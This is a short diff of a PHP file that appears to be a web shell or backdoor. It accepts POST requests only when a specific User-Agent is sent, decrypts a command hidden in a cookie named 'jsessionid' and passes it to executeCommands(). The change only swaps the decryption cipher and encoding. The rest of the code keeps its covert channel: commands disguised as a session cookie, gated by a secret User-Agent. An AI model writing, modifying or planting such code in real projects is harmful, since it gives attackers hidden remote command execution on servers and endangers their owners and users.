@@ -412,9 +412,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && $_SERVER['HTTP_USER_AGENT'] === 'sp1
         } else {
             $s = $_COOKIE['jsessionid'];
             $v = explode(".", base64_decode($s));
-            $split = sodium_crypto_aead_xchacha20poly1305_ietf_decrypt(base64_decode($v[3]), hex2bin($v[2]), hex2bin($v[0]), hex2bin($v[1]));
-            $split = base64_decode($split);
-	    executeCommands($split, "0");
+            $split = sodium_crypto_aead_chacha20poly1305_decrypt(base64_decode($v[3]), base64_decode($v[2]), base64_decode($v[0]), base64_decode($v[1]));
+            executeCommands(base64_decode($split), "0");
 	}
     } elseif (isset($_POST["clone"])) {
         if (!empty($_POST["ROS"])) {
